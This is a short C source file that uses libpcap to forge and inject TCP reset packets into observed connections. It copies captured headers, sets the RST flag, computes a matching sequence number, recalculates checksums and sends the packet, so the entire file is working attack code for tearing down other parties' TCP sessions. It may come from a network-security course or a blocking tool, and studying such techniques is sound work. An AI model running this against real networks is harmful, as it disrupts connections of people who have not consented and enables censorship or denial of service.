#include "pcap_project.h"

void inject_rst(pcap_t *handle_inject, const struct ether_header *ethernet, const struct ip *ip, const struct tcphdr *tcp, uint32_t payload_size)
{

    int fake_tcp_size = sizeof(struct tcphdr);

    u_char fake_packet[1500];
    memset(fake_packet, 0, 1500);
    memcpy(fake_packet,ethernet,sizeof(struct ether_header) + sizeof(struct ip) + fake_tcp_size);

    struct ether_header *fake_eth = (struct ether_header *)fake_packet;
    struct ip *fake_ip = (struct ip *)(fake_packet + sizeof(struct ether_header));
    struct tcphdr *fake_tcp = (struct tcphdr *)(fake_packet + sizeof(struct ether_header) + sizeof(struct ip));
   
    fake_ip->ip_hl = 5;
    fake_ip->ip_len = htons(sizeof(struct ip) + fake_tcp_size);

    fake_tcp->th_off = 5;
    fake_tcp->th_flags = TH_RST;

    uint32_t rst_correct_seq = ntohl(tcp->th_seq) + payload_size;
    fake_tcp->th_seq = htonl(rst_correct_seq);
    fake_tcp->th_ack = 0;

    fake_ip->ip_sum = 0;
    fake_tcp->th_sum = 0;

    fake_ip->ip_sum = csum((unsigned short *)fake_ip, sizeof(struct ip));

    Pseudo_header check_tcp;
    check_tcp.source_address = fake_ip->ip_src.s_addr;
    check_tcp.dest_address = fake_ip->ip_dst.s_addr;
    check_tcp.placeholder = 0;
    check_tcp.protocol = IPPROTO_TCP;
    check_tcp.tcp_length = htons(fake_tcp_size);

    u_char temp_buf_2[1500];
    memset(temp_buf_2, 0, 1500);
    memcpy(temp_buf_2, &check_tcp, sizeof(check_tcp));
    memcpy(temp_buf_2 + sizeof(check_tcp), fake_tcp, fake_tcp_size);

    fake_tcp->th_sum = csum((unsigned short *)temp_buf_2, sizeof(check_tcp) + fake_tcp_size);

    printf("리셋 인젝션 : %d\n",pcap_inject(handle_inject, fake_packet, sizeof(struct ether_header) + sizeof(struct ip) + fake_tcp_size));
}